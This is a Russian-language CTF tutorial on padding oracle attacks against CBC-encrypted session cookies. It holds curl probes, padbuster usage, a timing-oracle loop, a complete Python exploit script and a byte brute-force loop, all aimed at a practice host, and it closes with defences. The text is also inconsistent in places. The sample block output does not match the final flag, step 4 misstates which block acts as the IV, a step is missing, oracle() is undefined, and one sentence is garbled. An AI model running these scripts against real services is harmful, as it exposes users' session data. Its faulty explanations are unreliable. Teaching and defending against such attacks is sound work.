## Вопрос, с которого всё начинается

Сервис выдаёт зашифрованную cookie и честно отвечает разными ошибками: то «неверный формат», то «не удалось расшифровать». Кажется, что ошибки — мелочь. На самом деле по ним можно **полностью восстановить открытый текст**, не зная ключа. Атака называется **padding oracle**. Разберём, как она работает и почему.

## Наш пример: зашифрованная cookie

```
$ curl -s -b 'session=Q0JDQ0JDQ0JDQ0JD...' 'http://vault.ctf/profile'
Error: invalid padding
$ curl -s -b 'session=AAAAQ0JDQ0JD...' 'http://vault.ctf/profile'
Error: decryption failed
```

Два разных сообщения об ошибке — это и есть «оракул»: сервер сам говорит, угадали мы паддинг или нет.

## Шаг 1: как работает CBC

**CBC** (Cipher Block Chaining) — режим блочного шифра. Открытый текст режут на блоки по 16 байт. Каждый блок сначала **XOR**-ят с предыдущим шифртекстом, потом шифруют. Для первого блока роль предыдущего играет **IV** (вектор инициализации).

Ключевое свойство: чтобы расшифровать блок `C[i]`, нужно знать `C[i-1]` — он участвует в XOR. Значит, **подменяя предыдущий блок, мы управляем расшифровкой следующего**.

## Шаг 2: что такое паддинг

Открытый текст должен быть кратен 16 байтам. Если нет — добавляют **паддинг** (PKCS#7): `N` байт, каждый равен `N`. Например, не хватает 3 байт — дописывают `03 03 03`. Если хватает ровно — добавляют целый блок `10 10 ... 10` (16 байт).

Сервер расшифровал — и первым делом проверяет паддинг. Неверный паддинг → ошибка. Именно эта проверка и утекает наружу.

## Шаг 3: превращаем оракул в дешифратор

Хотим узнать последний байт открытого блока. Поставим в конец предыдущего блока подделанный байт `g` и будем перебирать его значение. Расшифрованный последний байт станет `P_last XOR g`. Если он равен `01` — паддинг из одного байта верен, сервер ответит «неверный паддинг» не будет. Значит, `g = P_last XOR 0x01`, и мы вычислили `P_last`!

Затем фиксируем последние два байта как `02 02` и перебираем предпоследний — и так по всему блоку. Для 16 байт это около `16 * 256 = 4096` запросов на блок.

## Шаг 4: идём по блокам

Расшифровав блок `C[i]` (через манипуляции с `C[i-1]`), переходим к предыдущему: для него роль «предыдущего» играет `C[i-2]`, а расшифрованный блок `C[i]` мы уже знаем и можем использовать как IV. Так восстанавливается весь шифртекст — от конца к началу.

## Шаг 5: автоматизация

Руками 4096 запросов не сделаешь. Пишут скрипт (или берут `padbuster`):

```
$ padbuster 'http://vault.ctf/profile' 'Q0JD...' 16 -cookies 'session=Q0JD...'
Block 1: nto{pad
Block 2: d1ng_0r4
Block 3: cl3_4nd_
Block 4: cbc}
```

Скрипт перебирает байты и по разнице ответов восстанавливает открытый текст.

## Полный прогон от начала до конца

```
$ python3 pad_oracle.py --url http://vault.ctf/profile --cookie session
[+] recovered: nto{p4dd1ng_0r4cl3_cbc_4tt4ck}
```

Инструмент сам ходит на сервер, отличает ответы и печатает plaintext.

## Если не сработало

- Режим не CBC (GCM/CTR) — паддинга нет, атака неприменима.
- Один общий ответ на все ошибки — оракула нет, но возможен timing-вариант.
- Данные сжаты — иногда помогает CRIME/BREACH, но это другая техника.
- Есть MAC поверх шифра — атака не пройдёт (правильный порядок: encrypt-then-MAC).

## Что мы теперь знаем

- Padding oracle восстанавливает CBC-plaintext по ошибкам паддинга.
- Управляя предыдущим блоком, мы управляем расшифровкой следующего.
- Атака требует ~4096 запросов на блок и автоматизируется.
- Защита — не показывать разницу ошибок и использовать encrypt-then-MAC.

## Шаг 7: почему именно CBC

Атака держится на двух свойствах CBC: (1) предыдущий блок XOR-ится с расшифрованным, и (2) есть паддинг, валидность которого проверяется. В **ECB** блоки независимы — менять соседа бессмысленно. В **CTR/потоковых** режимах паддинга нет вовсе, поэтому классический padding oracle неприменим. Именно сочетание «CBC + проверка паддинга + разные ошибки» и создаёт оракул.

Бывает, что сервис шифрует в CBC, но добавляет ещё и MAC. Тогда важно, в каком порядке: если сначала MAC, потом шифрование (MAC-then-encrypt), ошибки паддинга всё ещё могут утекать — и есть атаки вроде Lucky13. Если сначала шифрование, потом MAC (encrypt-then-MAC), оракул закрыт.

## Шаг 8: реальные примеры

- **ASP.NET ViewState (2010)** — известная атака на padding oracle в `machineKey`-шифровании; появился `padbuster`.
- **Java ServerFaces / MyFaces** — оракулы в шифровании состояния представления.
- **Ruby on Rails** — исторические утечки в cookie-сессиях.
- **Разные самодельные «шифрованные cookie»** — почти в каждом крупном веб-приложении старой школы.

Общий признак в CTF: сервер выдаёт значение в base64, длина кратна 16 (или 8), и при подмене последних байт отвечает **разными** ошибками. Часто это буквально `invalid padding` против `decryption failed`.

## Шаг 9: когда ответы одинаковые — timing

Если сервер возвращает одну и ту же страницу ошибки, прямой оракул исчезает. Но проверка паддинга может занимать разное время: валидный паддинг идёт дальше по коду и работает дольше. Тогда оракул становится **временным**: замеряем задержку и делаем вывод по ней. Это медленнее (нужны статистические повторы) и шумнее, но иногда единственный путь.

```
$ for g in $(seq 0 255); do
    t=$(curl -s -o /dev/null -w '%{time_total}' -b "session=<...$g>" http://vault.ctf/profile)
    echo "$g $t"
  done | sort -k2 -n | tail -3
```

Байты с наибольшим временем — кандидаты на валидный паддинг.

## Шаг 10: скрипт-эксплойт целиком

Структура скрипта простая: два блока шифртекста, перебор байта, фиксация уже найденных байт паддинга.

```
$ cat pad_oracle.py
import requests, base64
URL='http://vault.ctf/profile'
CT=base64.b64decode('Q0JDQ0JDQ0JDQ0JDQ0JDQ0JDQ0JD...')
blocks=[CT[i:i+16] for i in range(0,len(CT),16)]
plain=b''
for bi in range(len(blocks)-1,0,-1):
    prev=bytearray(blocks[bi-1]); inter=bytearray(16)
    for pad in range(1,17):
        for g in range(256):
            prev[-pad]=g
            probe=bytes(prev)+blocks[bi]
            if oracle(probe):
                inter[-pad]=g^pad
                for k in range(1,pad+1):
                    prev[-k]=inter[-k]^(pad+1)
                break
    plain=bytes(x^y for x,y in zip(inter,blocks[bi-1]))+plain
print(plain)
```

`oracle()` делает запрос и возвращает True, если паддинг верен. Скрипт восстанавливает блок за блоком.

## Шаг 11: защита

- **Не различать ошибки.** Один общий ответ на любую неудачу.
- **Encrypt-then-MAC.** Проверять MAC до расшифровки.
- **Использовать AEAD** (AES-GCM) вместо «CBC руками».
- **Константное время** на проверках.

Порядок операций критичен: сначала аутентифицируй, потом расшифровывай.

## Шаг 12: как искать в задаче

Признаки padding oracle:

1. Шифртекст в base64, длина кратна 16.
2. Есть поле, которое можно менять (cookie, параметр).
3. Сервер отвечает по-разному при порче последних байт.
4. Сообщения об ошибках хоть чуть-чуть различаются.

Найди один «правильный» байт перебором — и дальше атака раскручивается механически.

## Мини-практика: восстанови один байт

Прежде чем писать полный эксплойт, проверь, что оракул вообще есть. Возьми последний байт предпоследнего блока и перебери 256 значений, глядя на ответы:

```
$ for g in $(seq 0 255); do
    b=$(printf '\x%02x' $g)
    out=$(curl -s -b "session=$(echo -n "$PREV$b$LAST" | base64)" http://vault.ctf/profile)
    case "$out" in
      *'invalid padding'*) : ;;        # паддинг неверен
      *) echo "candidate byte=$g -> $out";;
    esac
  done
candidate byte=0x1f -> Error: decryption failed
```

Ровно один байт даёт **другой** ответ — это и есть оракул. Из него сразу вычисляется последний байт открытого текста: `P_last = g XOR 0x01`.

## Шпаргалка по padding oracle

- Условие: CBC + проверка паддинга + различимые ответы (или timing).
- Единица работы: последний байт блока; затем фиксируем паддинг `02 02`, `03 03 03` и т.д.
- Количество запросов: ~4096 на блок (16 × 256), на практике меньше.
- Идём от последнего блока к первому, используя расшифрованный блок как новый IV.
- Инструменты: `padbuster`, свой скрипт на `requests`.
- Защита: единый ответ на ошибки + encrypt-then-MAC или AEAD.

Порядок: 1) найти оракул, 2) восстановить последний байт, 3) «закрепить» паддинг и идти влево, 4) собрать plaintext.
